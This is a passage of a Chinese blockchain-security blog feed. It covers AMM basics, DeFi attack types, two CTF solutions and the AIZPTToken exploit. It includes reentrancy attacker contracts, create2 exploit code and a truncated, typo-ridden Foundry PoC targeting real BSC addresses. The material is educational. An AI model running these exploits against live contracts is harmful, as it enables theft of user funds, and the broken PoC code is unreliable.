池。</p><p>等等，所以任何人都可以成为做市商？确实如此！向流动性池中添加资金非常容易。奖励由协议决定。例如，Uniswap v2 向交易者收取 0.3% 的费用，这些费用直接流向 LP。其他平台或分叉可能会收取较低的费用，以吸引更多流动性提供者加入其池子。</p><p>为什么吸引流动性很重要？根据 AMM 的工作方式，池中的流动性越多，大额订单可能产生的滑点就越少。这反过来可能会吸引更多交易量到平台，等等。</p><p>滑点问题会因不同的 AMM 设计而有所不同，但这绝对是需要注意的。请记住，定价是由算法决定的。简而言之，它取决于交易后流动性池中代币之间的比率变化程度。如果比率变化幅度很大，就会出现大量滑点。</p><p>更进一步说，假设你想购买 Uniswap 上 ETH&#x2F;DAI 池中的所有 ETH。你做不到！你必须为每个额外的 ETH 支付越来越高的溢价，但仍然无法从池中全部购买。为什么？这是因为公式 x * y &#x3D; k。如果 x 或 y 为零，意味着池中的 ETH 或 DAI 为零，则该等式不再有意义。</p><p>但这并不是关于 AMM 和流动性池的完整故事。在为 AMM 提供流动性时，你还需要记住另一件事——无常损失。</p><h1 id="什么是无常损失？"><a href="#什么是无常损失？" class="headerlink" title="什么是无常损失？"></a>什么是无常损失？</h1><p>无常损失是指将存入的代币存入池后其价格比率发生变化的情况。变化越大，无常损失越大。这就是为什么 AMM 最适合使用具有相似价值的代币对（例如稳定币或包装代币）。如果该对之间的价格比率保持在相对较小的范围内，则无常损失也可以忽略不计。</p><p>另一方面，如果比率变化很大，流动性提供者可能最好只是持有代币，而不是向池子里添加资金。即便如此，像 ETH&#x2F;DAI 这样容易遭受无常损失的 Uniswap 池子也因它们累积的交易费而盈利。</p><p>话虽如此，无常损失并不是这种现象的好名字。“无常”假设如果资产恢复到最初存入时的价格，损失就会减轻。然而，如果你以与存入时不同的价格比率提取资金，损失将是永久性的。在某些情况下，交易费可能会减轻损失，但考虑风险仍然很重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>矿工攻击</title>
      <link href="/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p> 矿工可以验证交易并将它添加到区块链中，操纵哈希或者时时间戳等区块属性来影响合约的执行或结果</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p> 是否明智使用了block.timestamp，尤其是对于较长的间隔，block.timestamp可以被矿工再很小的程度上操纵，影刺依赖它进行计算时可能会有风险</p><h2 id="价格操控攻击"><a href="#价格操控攻击" class="headerlink" title="价格操控攻击"></a>价格操控攻击</h2><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p> 攻击者故意改变去中心化交易所的资产价格，通常是为了依赖利用合约或者交易</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>如果价格或资产之间的汇率是从余额比率得出的，则可以对其进行操纵。闪电贷和捐赠是众所周知的用于操纵价格的攻击媒介。</p><h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p>重入攻击是一种针对智能合约的安全漏洞，攻击者利用合约在执行期间的状态不一致性，通过多次调用合约的某个函数，从而导致资金或数据的异常损失。下面将详细细分重入攻击的类型，并通过具体示例进行说明。</p><h3 id="单个合约重入攻击"><a href="#单个合约重入攻击" class="headerlink" title="单个合约重入攻击"></a>单个合约重入攻击</h3><h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>攻击者利用合约中的漏洞，在同一合约内重复调用函数，导致状态不一致或资金损失。</p><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>某个合约允许用户提取资金，攻击者利用重入漏洞在提现过程中多次调用提现函数，导致超过账户余额的提取。</p><h3 id="跨合约重入攻击"><a href="#跨合约重入攻击" class="headerlink" title="跨合约重入攻击"></a>跨合约重入攻击</h3><h4 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>攻击者首先调用一个合约的函数，该函数再调用另一个合约的函数，然后再通过回调再次调用原合约，造成多次执行。</p><h4 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h4><p>攻击者首先通过一个合约调用一个函数，该函数在执行时又调用了另一个合约的提现功能，再通过该合约的回调再次执行提取。</p><h3 id="可重入合约"><a href="#可重入合约" class="headerlink" title="可重入合约"></a>可重入合约</h3><h4 id="漏洞描述：-2"><a href="#漏洞描述：-2" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>攻击者能够利用合约在执行期间保持的状态，通过合约中的逻辑漏洞进行多次操作。</p><h4 id="举例：-2"><a href="#举例：-2" class="headerlink" title="举例："></a>举例：</h4><p>某合约在处理资金转移时未能正确更新余额，导致攻击者能够多次调用并提取资金。</p><h3 id="不可重入合约"><a href="#不可重入合约" class="headerlink" title="不可重入合约"></a>不可重入合约</h3><h4 id="漏洞描述：-3"><a href="#漏洞描述：-3" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>设计上防止重入，但可能由于外部合约的逻辑漏洞而被攻击。</p><h4 id="举例：-3"><a href="#举例：-3" class="headerlink" title="举例："></a>举例：</h4><p>如果合约调用了不安全的外部合约，而该外部合约的逻辑存在重入漏洞，依然可能导致攻击。</p><ol start="2"><li>重入攻击示例<br>2.1 单合约重入攻击示例<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&amp;gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &amp;gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        // 调用外部合约</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>攻击者合约：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerable) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &amp;gt;= 1 ether);</span><br><span class="line">        vulnerable.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        vulnerable.withdraw(1 ether); // 初次提现</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回调函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &amp;gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // 继续重入</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>攻击过程：</li></ol><p>19.攻击者先存入 1 Ether，然后调用 withdraw 函数进行提取。<br>20.在提取过程中，由于未更新余额，攻击者的回调函数 receive 被触发。<br>21.该函数再次调用 withdraw 函数，从而继续提取资金，导致合约资金损失。</p><p>2.2 跨合约重入攻击示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    mapping(address =&amp;gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &amp;gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount; // 更新余额</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker &#123;</span><br><span class="line">    Target public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Target(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &amp;gt;= 1 ether);</span><br><span class="line">        target.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        target.withdraw(1 ether); // 开始攻击</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(target).balance &amp;gt;= 1 ether) &#123;</span><br><span class="line">            target.withdraw(1 ether); // 重入攻击</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击过程：</p><p>22.攻击者向目标合约存入资金并调用 withdraw。<br>23.当目标合约尝试将 Ether 转给攻击者时，回调 receive 被触发，攻击者再次调用 withdraw。<br>24.这一过程持续进行，直到合约资金耗尽。</p><ol start="3"><li>防范重入攻击的方法</li></ol><p>25.检查-效果-交互模式：在进行外部调用之前，首先更新合约状态。<br>26.使用重入锁：在合约中设置状态变量以防止重入。<br>27.使用安全库：借助如 OpenZeppelin 这样的经过审计的智能合约库，避免已知漏洞。<br>28.限制外部调用：尽量减少合约对外部合约的调用次数和频率。</p><p>总结<br>重入攻击是一种常见且严重的安全漏洞，开发者必须在设计和实现智能合约时采取适当的安全措施，以防止此类攻击。理解重入攻击的细分类型和具体示例可以帮助开发者更好地识别和修复潜在的安全漏洞。</p><h2 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h2><h3 id="对于失败事务的重放攻击"><a href="#对于失败事务的重放攻击" class="headerlink" title="对于失败事务的重放攻击"></a>对于失败事务的重放攻击</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>一个初始交易失败了，如果没有防护机制，而攻击者又通过网络监听工具捕获到了这个失败的交易数据包，那么攻击者就可以重新发送这个交易，造成资金的重复扣除，或者资金的重复转移</p><h3 id="不同链上的签名重放"><a href="#不同链上的签名重放" class="headerlink" title="不同链上的签名重放"></a>不同链上的签名重放</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>在一条链上的有效签名可能会在另一条链上重放</p><h4 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h4><p>1，相同地址在不同链上<br>假设用户 A 在以太坊链（Ethereum）和以太坊经典链（Ethereum Classic）上使用相同的地址（公钥）。如果用户 A 在以太坊上发起了一笔交易并签名：<br>a,攻击者可以捕获这个交易，然后在以太坊经典链上重放这个交易。<br>b,由于这两个链都使用了相似的地址格式，攻击者可以成功地在以太坊经典链上转移用户 A 的资产。</p><p>2,跨链重放攻击<br>一些链可能会使用类似的交易格式。如果链 A 和链 B 都是以太坊虚拟机（EVM）兼容链：<br>a,用户 A 在链 A 上发送了一笔交易。<br>b,攻击者可以把同样的交易信息（包括签名）提交到链 B。<br>c,如果链 B 不进行链 ID 或其他唯一标识的检查，攻击者可能成功重放交易。</p><h2 id="地毯拉力"><a href="#地毯拉力" class="headerlink" title="地毯拉力"></a>地毯拉力</h2><p>地毯拉力攻击是一种特定的欺诈行为，主要发生在去中心化金融（DeFi）和其他基于区块链的应用中。这种攻击通常涉及一个恶意开发者或团队创建一个看似合法的项目，吸引用户投资或提供流动性，但最终他们会通过某种方式迅速撤回资金，导致投资者损失惨重。</p><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>1.假冒项目：攻击者通常创建一个新的加密货币或去中心化应用，宣传其潜在收益，吸引投资者参与。<br>2.流动性撤回：一旦足够多的用户投资或提供流动性，攻击者会撤回流动性池中的所有资产，导致代币价值暴跌。<br>3.信任利用：这种攻击往往利用了用户对去中心化金融项目的信任，尤其是新项目往往缺乏足够的透明度和审计。<br>4.快速撤资：攻击者会迅速转换为稳定币或其他更稳定的资产，以避免价格波动对他们资金的影响。</p><h4 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h4><p>1,DeFi项目：一些新兴的DeFi项目可能会在短时间内吸引大量资金，攻击者会通过在社交媒体上制造热度来吸引投资者。投资者在没有进行充分尽职调查的情况下，盲目跟风投资，最终遭受损失。<br>2,代币发行：攻击者发布一个新代币，并在上线初期表现良好，随后在价格上涨时抛售持有的代币，导致代币价格暴跌。</p><h2 id="三明治攻击"><a href="#三明治攻击" class="headerlink" title="三明治攻击"></a>三明治攻击</h2><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>攻击者可以监控内存池，并在用户交易之前和之后放置两个交易。</p><h4 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h4><p>当攻击者发现一笔大额交易时，首先执行自己的交易以操纵价格，然后在用户的交易执行后通过平仓来获利</p><h2 id="女巫攻击"><a href="#女巫攻击" class="headerlink" title="女巫攻击"></a>女巫攻击</h2><h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>攻击者通过控制多个账户或者利用多个交易来操纵市场或者影响特定的智能合约行为</p><h4 id="举例-5"><a href="#举例-5" class="headerlink" title="举例"></a>举例</h4><p>假设某个用户在去中心化交易所上进行大额交易，导致某个代币的价格上涨。<br>1，攻击者监控市场：攻击者监控到用户的交易，并预测价格将上涨。<br>2，创建假需求：攻击者在多个账户中同时下单购买该代币，进一步推高价格。<br>3，获利抛售：一旦价格达到一个理想的水平，攻击者便在合适的时机抛售手中的代币，获得差价收益。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意破环攻击</title>
      <link href="/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>攻击者通过恶意破坏系统，通常它们不会有盈利的，就是恶意破坏运营和用户，它们可以通过链上的轻微改变来阻止用户交易</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-The lost Kitty</title>
      <link href="/2024/10/15/CTF-The-lost-Kitty/"/>
      <url>/2024/10/15/CTF-The-lost-Kitty/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-The-lost-kitty"><a href="#CTF-The-lost-kitty" class="headerlink" title="CTF-The lost kitty"></a>CTF-The lost kitty</h1><p>题目就是Lucas在一个空间为2^256的房间丢失了一只猫，要求我们找到这只小猫，题目的源代码，如下：<br>&#x2F;&#x2F; SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;</p><p>contract HiddenKittyCat {<br>    address private immutable _owner;</p><p>    constructor() {<br>        _owner &#x3D; msg.sender;<br>        bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</p><p>        assembly {<br>            sstore(slot, “KittyCat!”)<br>        }<br>    }</p><p>    function areYouHidingHere(bytes32 slot) external view returns (bool) {<br>        require(msg.sender &#x3D;&#x3D; _owner, “!owner”);<br>        bytes32 kittyPointer;</p><p>        assembly {<br>            kittyPointer :&#x3D; sload(slot)<br>        }</p><p>        return kittyPointer &#x3D;&#x3D; “KittyCat!”;<br>    }</p><p>    function destroyMe() external {<br>        require(msg.sender &#x3D;&#x3D; _owner, “!owner”);<br>        selfdestruct(payable(address(0)));<br>    }<br>}</p><p>contract House {<br>    bool public catFound;</p><p>    function isKittyCatHere(bytes32 _slot) external {<br>        if (catFound) {<br>            return;<br>        }<br>        HiddenKittyCat hiddenKittyCat &#x3D; new HiddenKittyCat();<br>        bool found &#x3D; hiddenKittyCat.areYouHidingHere(_slot);</p><p>        if (!found) {<br>            hiddenKittyCat.destroyMe();<br>        } else {<br>            catFound &#x3D; true;<br>        }<br>    }<br>}</p><p> 阅读完整个代码，好像似曾相识，原来在以前的ethernaut里见过，这个题类似于Ethernaut里的Flipflopcoin，都是答案已经出来了</p><p> 首先hidekittycat合约中的函数都有require（msg.sender&#x3D;&#x3D;owner）的验证，如果想直接调用areYoufindhere函数，这样会很难调用， 这kittycat题又是涉及到汇编的知识，不过这个汇编很好理解，slot为储存位置，使用sstore汇编语言，将kittycat储存到slot位置上，然而这个slot的具体值，已经在构造函数中计算出来了。再来看看house合约，在isKittyCathouse函数中，只要我们传入正确的_slot，就能使catFound变为ture,而正确的_slot在前面已经有了，所以我们只需要写一个攻击合约，如下：</p><p>&#x2F;&#x2F;SPDX-License-Identifier:MIT</p><p>pragma solidity ^0.8.0;</p><p>interface Ihouse{<br>     function isKittyCatHere(bytes32 _slot) external;<br>}<br>contract Attracker{<br>     Ihouse public target;</p><p>     constructor(address _target){<br>        target &#x3D; Ihouse(_target);<br>     }</p><p>     function pwn () external {<br>      bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));<br>      target.isKittyCatHere(slot);<br>     }<br>}</p><p>先部署house合约，得到它的地址：0xE726d7E7739188f0fA45267997eA97b8b1D891E6</p><p>在部署Attracter合约，传入house合约的地址，调用pwn函数，即可</p><p>最后查看cat是否找到，CatFound就变为ture,说明已经找到cat.</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Creativity</title>
      <link href="/2024/10/14/CTF-Creativity/"/>
      <url>/2024/10/14/CTF-Creativity/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Creativity"><a href="#CTF-Creativity" class="headerlink" title="CTF-Creativity"></a>CTF-Creativity</h1><p>题目：要求调用sendFlag(),记录事件<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Creativity &#123;</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    </span><br><span class="line">    address public target;</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line">    </span><br><span class="line">    function check(address _addr) public &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; size := extcodesize(_addr) &#125;</span><br><span class="line">        require(size &gt; 0 &amp;&amp; size &lt;= 4);</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function execute() public &#123;</span><br><span class="line">        require(target != address(0));</span><br><span class="line">        target.delegatecall(abi.encodeWithSignature(&quot;&quot;));</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这题涉及到汇编，委托调用，还有一个不明显的create2的用法<br>  首先看到check函数，要求参数地址的合约代码大小不能超过4字节，这是很难办到的，在ethernaunt上遇到过这种类似的题，只不过那上面的题考察点没有这个题多。<br>  继续看到execute函数，首先进行了零地址的检查，在进行委托调用，最后是自毁函数<br>  如果我们要直接调用sendFlag函数，必须发送value大于100000000ehter，这是肯定是不可采取的措施，怎样才能绕过这个require,我们就要回到execute函数中，突破口是：target.detegatecall(),通过委托调用target合约，执行结果在Createtivity合约中，这样就清晰了<br>  我们可以通过create2的一个骚操作，在同一个地址上部署合约，合约的字节码可以不同，简单来说，就是在同一个地址上先后部署不同的合约，这样就可以实现，第一个部署的合约，满足自毁函数，第二个部署的合约，实现合约中的emit SendFlag事件<br>  接下来就是考虑如何用代码实现create的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes memory code) public &#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        // Compile Dumper to get this bytecode</span><br><span class="line">        bytes memory dumperBytecode = hex&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        Deployer dp = Deployer(msg.sender);</span><br><span class="line">        bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return (add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上有俩个代码，先部署Dumper合约，获得它的字节码，Deployer合约实现create2的功能<br>首先先将Deployer 部署，获得地址：0x307FdF03B1842A501F52221e4cF02D67BfeEc399<br>然后使用Deployer.deploy部署0x33ff，得到部署的合约地址0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663</p><p>调用check()，target就是我们部署的合约</p><p>然后在进行自毁，给我们已经部署的合约发一笔空交易，让它进行自毁，再次使用create2的操作，还是使用Deployer.deploy在这个地址部署另一个合约，合约的内容要包括emit SendFlag(0),<br>这里有个简单的hack合约<br>contract hack {<br>    event SendFlag(address addr);<br>    constructor() public {<br>        emit SendFlag(address(0));<br>    }<br>}<br>最后再调用execute函数，就会执行我们第二次部署的合约里的emit SendFlag;</p><p>完成以上步骤，就可以看到我们已经成功执行了emit SendFlag</p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>creat2的用法：在solidity 8.0版本之后，都是使用new关键字来创建合约，但是它还有一种就是使用内联汇编(assembly)</p><p>主要说一下，new的方法创建合约.直接上合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 被创建合约</span><br><span class="line">contract Callee &#123;</span><br><span class="line">  string value1;</span><br><span class="line">  string value2;</span><br><span class="line"></span><br><span class="line">  // 构造函数有两个参数</span><br><span class="line">  constructor(string memory _value1,string memory _value2) &#123;</span><br><span class="line">    value1 = _value1;</span><br><span class="line">    value2 = _value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 合约创建者</span><br><span class="line">contract ContractCreator &#123;</span><br><span class="line">  // 新合约地址</span><br><span class="line">  address public contractAddress;</span><br><span class="line"></span><br><span class="line">  // 创建合约</span><br><span class="line">  function newContract(string memory value1,string memory value2) external &#123;</span><br><span class="line">    // 生成盐值</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(value1,value2));</span><br><span class="line">    // 创建 Callee 合约实例，参数为 _salt, value1, value2</span><br><span class="line">    Callee callee = new Callee&#123;salt:salt&#125;(value1, value2);</span><br><span class="line">    // 设置新建合约的地址</span><br><span class="line">    contractAddress = address(callee);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>委托调用:看这俩篇<a href="https://learnblockchain.cn/article/5372">文章1</a>，<a href="https://blog.csdn.net/ak19920601/article/details/135908265">文章2</a>,讲的很好。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20241005AIZPTToken攻击事件分析</title>
      <link href="/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="AIZPTToken攻击事件分析"><a href="#AIZPTToken攻击事件分析" class="headerlink" title="AIZPTToken攻击事件分析"></a>AIZPTToken攻击事件分析</h2><p>先大概描述一下：攻击者使用闪电贷借的钱，然后再购买了价值8000 BNB的AIPTToken,然后再以高价卖出，从中得到利润，还清借款，最终获得价值34BNB（约俩万美金）。</p><p>这是发生在最近的攻击，首先攻击者发现了这个AIZPTToken代币买卖的计算错误，下面是截取的AIZPTToken合约中的一段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>从上面，可以发现，用少量的BNB购买AIZPTToken,就可以以高价出售，具体可以对比俩段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>第一个是买AIPTToken,如果以20的价钱购买12个代币，然后我们出售代币的时候，以同样20的价格出售，那么购买人获得代币的数量是少于12的，换种方法来说，就是可以以高价出售相同代币的数量</p><p>下面是攻击者的攻击的测试合约</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    